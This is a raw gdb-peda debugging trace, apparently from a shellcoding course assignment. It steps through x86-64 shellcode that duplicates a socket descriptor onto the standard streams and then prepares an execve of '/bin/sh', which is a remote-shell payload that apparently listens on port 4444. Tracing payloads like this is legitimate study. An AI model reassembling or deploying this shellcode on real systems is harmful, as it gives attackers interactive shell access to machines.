RDX: 0x10 
RSI: 0x1 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x601099 --> 0x99583b6af675050f 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601093 <code+51>:	dec    rsi
   0x601096 <code+54>:	push   0x21
   0x601098 <code+56>:	pop    rax
=> 0x601099 <code+57>:	syscall 
   0x60109b <code+59>:	jne    0x601093 <code+51>
   0x60109d <code+61>:	push   0x3b
   0x60109f <code+63>:	pop    rax
   0x6010a0 <code+64>:	cdq
Guessed arguments:
arg[0]: 0x4 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601099 in code ()
gdb-peda$ 















[----------------------------------registers-----------------------------------]
RAX: 0x1 
RBX: 0x0 
RCX: 0x60109b --> 0xbb4899583b6af675 
RDX: 0x10 
RSI: 0x1 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x60109b --> 0xbb4899583b6af675 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601096 <code+54>:	push   0x21
   0x601098 <code+56>:	pop    rax
   0x601099 <code+57>:	syscall 
=> 0x60109b <code+59>:	jne    0x601093 <code+51>
 | 0x60109d <code+61>:	push   0x3b
 | 0x60109f <code+63>:	pop    rax
 | 0x6010a0 <code+64>:	cdq
 | 0x6010a1 <code+65>:	movabs rbx,0x68732f6e69622f
 |->   0x601093 <code+51>:	dec    rsi
       0x601096 <code+54>:	push   0x21
       0x601098 <code+56>:	pop    rax
       0x601099 <code+57>:	syscall
                                                                  JUMP is taken
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060109b in code ()
gdb-peda$ 












[----------------------------------registers-----------------------------------]
RAX: 0x1 
RBX: 0x0 
RCX: 0x60109b --> 0xbb4899583b6af675 
RDX: 0x10 
RSI: 0x1 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x601093 --> 0x50f58216aceff48 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60108e <code+46>:	xchg   rdi,rax
   0x601090 <code+48>:	push   0x3
   0x601092 <code+50>:	pop    rsi
=> 0x601093 <code+51>:	dec    rsi
   0x601096 <code+54>:	push   0x21
   0x601098 <code+56>:	pop    rax
   0x601099 <code+57>:	syscall 
   0x60109b <code+59>:	jne    0x601093 <code+51>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601093 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x1 
RBX: 0x0 
RCX: 0x60109b --> 0xbb4899583b6af675 
RDX: 0x10 
RSI: 0x0 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x601096 --> 0x6af675050f58216a 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601090 <code+48>:	push   0x3
   0x601092 <code+50>:	pop    rsi
   0x601093 <code+51>:	dec    rsi
=> 0x601096 <code+54>:	push   0x21
   0x601098 <code+56>:	pop    rax
   0x601099 <code+57>:	syscall 
   0x60109b <code+59>:	jne    0x601093 <code+51>
   0x60109d <code+61>:	push   0x3b
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601096 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x1 
RBX: 0x0 
RCX: 0x60109b --> 0xbb4899583b6af675 
RDX: 0x10 
RSI: 0x0 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe488 --> 0x21 ('!')
RIP: 0x601098 --> 0x583b6af675050f58 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601092 <code+50>:	pop    rsi
   0x601093 <code+51>:	dec    rsi
   0x601096 <code+54>:	push   0x21
=> 0x601098 <code+56>:	pop    rax
   0x601099 <code+57>:	syscall 
   0x60109b <code+59>:	jne    0x601093 <code+51>
   0x60109d <code+61>:	push   0x3b
   0x60109f <code+63>:	pop    rax
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe488 --> 0x21 ('!')
0008| 0x7fffffffe490 --> 0x5c110002 
0016| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0024| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0032| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0040| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0048| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0056| 0x7fffffffe4c0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601098 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x21 ('!')
RBX: 0x0 
RCX: 0x60109b --> 0xbb4899583b6af675 
RDX: 0x10 
RSI: 0x0 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x601099 --> 0x99583b6af675050f 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x302 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601093 <code+51>:	dec    rsi
   0x601096 <code+54>:	push   0x21
   0x601098 <code+56>:	pop    rax
=> 0x601099 <code+57>:	syscall 
   0x60109b <code+59>:	jne    0x601093 <code+51>
   0x60109d <code+61>:	push   0x3b
   0x60109f <code+63>:	pop    rax
   0x6010a0 <code+64>:	cdq
Guessed arguments:
arg[0]: 0x4 
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000601099 in code ()
gdb-peda$ 















[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x60109b --> 0xbb4899583b6af675 
RDX: 0x10 
RSI: 0x0 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x60109b --> 0xbb4899583b6af675 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601096 <code+54>:	push   0x21
   0x601098 <code+56>:	pop    rax
   0x601099 <code+57>:	syscall 
=> 0x60109b <code+59>:	jne    0x601093 <code+51>
   0x60109d <code+61>:	push   0x3b
   0x60109f <code+63>:	pop    rax
   0x6010a0 <code+64>:	cdq    
   0x6010a1 <code+65>:	movabs rbx,0x68732f6e69622f
                                                              JUMP is NOT taken
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060109b in code ()
gdb-peda$ 
















[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x60109b --> 0xbb4899583b6af675 
RDX: 0x10 
RSI: 0x0 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x60109d --> 0x622fbb4899583b6a 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601098 <code+56>:	pop    rax
   0x601099 <code+57>:	syscall 
   0x60109b <code+59>:	jne    0x601093 <code+51>
=> 0x60109d <code+61>:	push   0x3b
   0x60109f <code+63>:	pop    rax
   0x6010a0 <code+64>:	cdq    
   0x6010a1 <code+65>:	movabs rbx,0x68732f6e69622f
   0x6010ab <code+75>:	push   rbx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060109d in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x60109b --> 0xbb4899583b6af675 
RDX: 0x10 
RSI: 0x0 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe488 --> 0x3b (';')
RIP: 0x60109f --> 0x6e69622fbb489958 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x601099 <code+57>:	syscall 
   0x60109b <code+59>:	jne    0x601093 <code+51>
   0x60109d <code+61>:	push   0x3b
=> 0x60109f <code+63>:	pop    rax
   0x6010a0 <code+64>:	cdq    
   0x6010a1 <code+65>:	movabs rbx,0x68732f6e69622f
   0x6010ab <code+75>:	push   rbx
   0x6010ac <code+76>:	mov    rdi,rsp
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe488 --> 0x3b (';')
0008| 0x7fffffffe490 --> 0x5c110002 
0016| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0024| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0032| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0040| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0048| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0056| 0x7fffffffe4c0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000060109f in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x0 
RCX: 0x60109b --> 0xbb4899583b6af675 
RDX: 0x10 
RSI: 0x0 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x6010a0 --> 0x2f6e69622fbb4899 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60109b <code+59>:	jne    0x601093 <code+51>
   0x60109d <code+61>:	push   0x3b
   0x60109f <code+63>:	pop    rax
=> 0x6010a0 <code+64>:	cdq    
   0x6010a1 <code+65>:	movabs rbx,0x68732f6e69622f
   0x6010ab <code+75>:	push   rbx
   0x6010ac <code+76>:	mov    rdi,rsp
   0x6010af <code+79>:	push   rdx
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00000000006010a0 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x0 
RCX: 0x60109b --> 0xbb4899583b6af675 
RDX: 0x0 
RSI: 0x0 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x6010a1 --> 0x732f6e69622fbb48 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60109d <code+61>:	push   0x3b
   0x60109f <code+63>:	pop    rax
   0x6010a0 <code+64>:	cdq    
=> 0x6010a1 <code+65>:	movabs rbx,0x68732f6e69622f
   0x6010ab <code+75>:	push   rbx
   0x6010ac <code+76>:	mov    rdi,rsp
   0x6010af <code+79>:	push   rdx
   0x6010b0 <code+80>:	push   rdi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00000000006010a1 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x68732f6e69622f ('/bin/sh')
RCX: 0x60109b --> 0xbb4899583b6af675 
RDX: 0x0 
RSI: 0x0 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe490 --> 0x5c110002 
RIP: 0x6010ab --> 0x89485752e7894853 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x60109f <code+63>:	pop    rax
   0x6010a0 <code+64>:	cdq    
   0x6010a1 <code+65>:	movabs rbx,0x68732f6e69622f
=> 0x6010ab <code+75>:	push   rbx
   0x6010ac <code+76>:	mov    rdi,rsp
   0x6010af <code+79>:	push   rdx
   0x6010b0 <code+80>:	push   rdi
   0x6010b1 <code+81>:	mov    rsi,rsp
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe490 --> 0x5c110002 
0008| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0016| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0024| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0032| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0048| 0x7fffffffe4c0 --> 0x0 
0056| 0x7fffffffe4c8 --> 0x7fffffffe598 --> 0x7fffffffe7bc ("/src/src/Assignment 5/shellcode2")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00000000006010ab in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x68732f6e69622f ('/bin/sh')
RCX: 0x60109b --> 0xbb4899583b6af675 
RDX: 0x0 
RSI: 0x0 
RDI: 0x4 
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe488 --> 0x68732f6e69622f ('/bin/sh')
RIP: 0x6010ac --> 0xe689485752e78948 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x6010a0 <code+64>:	cdq    
   0x6010a1 <code+65>:	movabs rbx,0x68732f6e69622f
   0x6010ab <code+75>:	push   rbx
=> 0x6010ac <code+76>:	mov    rdi,rsp
   0x6010af <code+79>:	push   rdx
   0x6010b0 <code+80>:	push   rdi
   0x6010b1 <code+81>:	mov    rsi,rsp
   0x6010b4 <code+84>:	syscall
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe488 --> 0x68732f6e69622f ('/bin/sh')
0008| 0x7fffffffe490 --> 0x5c110002 
0016| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0024| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0032| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0040| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0048| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0056| 0x7fffffffe4c0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00000000006010ac in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x68732f6e69622f ('/bin/sh')
RCX: 0x60109b --> 0xbb4899583b6af675 
RDX: 0x0 
RSI: 0x0 
RDI: 0x7fffffffe488 --> 0x68732f6e69622f ('/bin/sh')
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe488 --> 0x68732f6e69622f ('/bin/sh')
RIP: 0x6010af --> 0x50fe689485752 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x6010a1 <code+65>:	movabs rbx,0x68732f6e69622f
   0x6010ab <code+75>:	push   rbx
   0x6010ac <code+76>:	mov    rdi,rsp
=> 0x6010af <code+79>:	push   rdx
   0x6010b0 <code+80>:	push   rdi
   0x6010b1 <code+81>:	mov    rsi,rsp
   0x6010b4 <code+84>:	syscall 
   0x6010b6 <code+86>:	add    BYTE PTR [rax],al
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe488 --> 0x68732f6e69622f ('/bin/sh')
0008| 0x7fffffffe490 --> 0x5c110002 
0016| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0024| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0032| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0040| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0048| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0056| 0x7fffffffe4c0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00000000006010af in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x68732f6e69622f ('/bin/sh')
RCX: 0x60109b --> 0xbb4899583b6af675 
RDX: 0x0 
RSI: 0x0 
RDI: 0x7fffffffe488 --> 0x68732f6e69622f ('/bin/sh')
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe480 --> 0x0 
RIP: 0x6010b0 --> 0x50fe6894857 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x6010ab <code+75>:	push   rbx
   0x6010ac <code+76>:	mov    rdi,rsp
   0x6010af <code+79>:	push   rdx
=> 0x6010b0 <code+80>:	push   rdi
   0x6010b1 <code+81>:	mov    rsi,rsp
   0x6010b4 <code+84>:	syscall 
   0x6010b6 <code+86>:	add    BYTE PTR [rax],al
   0x6010b8:	add    BYTE PTR [rax],al
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe480 --> 0x0 
0008| 0x7fffffffe488 --> 0x68732f6e69622f ('/bin/sh')
0016| 0x7fffffffe490 --> 0x5c110002 
0024| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0032| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0040| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
0048| 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
0056| 0x7fffffffe4b8 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00000000006010b0 in code ()
gdb-peda$ 

















[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x68732f6e69622f ('/bin/sh')
RCX: 0x60109b --> 0xbb4899583b6af675 
RDX: 0x0 
RSI: 0x0 
RDI: 0x7fffffffe488 --> 0x68732f6e69622f ('/bin/sh')
RBP: 0x7fffffffe4b0 --> 0x4005a0 (<__libc_csu_init>:	push   r15)
RSP: 0x7fffffffe478 --> 0x7fffffffe488 --> 0x68732f6e69622f ('/bin/sh')
RIP: 0x6010b1 --> 0x50fe68948 
R8 : 0x0 
R9 : 0x16 
R10: 0x0 
R11: 0x346 
R12: 0x400470 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe590 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x6010ac <code+76>:	mov    rdi,rsp
   0x6010af <code+79>:	push   rdx
   0x6010b0 <code+80>:	push   rdi
=> 0x6010b1 <code+81>:	mov    rsi,rsp
   0x6010b4 <code+84>:	syscall 
   0x6010b6 <code+86>:	add    BYTE PTR [rax],al
   0x6010b8:	add    BYTE PTR [rax],al
   0x6010ba:	add    BYTE PTR [rax],al
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe478 --> 0x7fffffffe488 --> 0x68732f6e69622f ('/bin/sh')
0008| 0x7fffffffe480 --> 0x0 
0016| 0x7fffffffe488 --> 0x68732f6e69622f ('/bin/sh')
0024| 0x7fffffffe490 --> 0x5c110002 
0032| 0x7fffffffe498 --> 0x40059c (<main+54>:	nop)
0040| 0x7fffffffe4a0 --> 0x7fffffffe590 --> 0x1 
0048| 0x7fffffffe4a8 --> 0x601060 --> 0x6a5f026a9958296a 
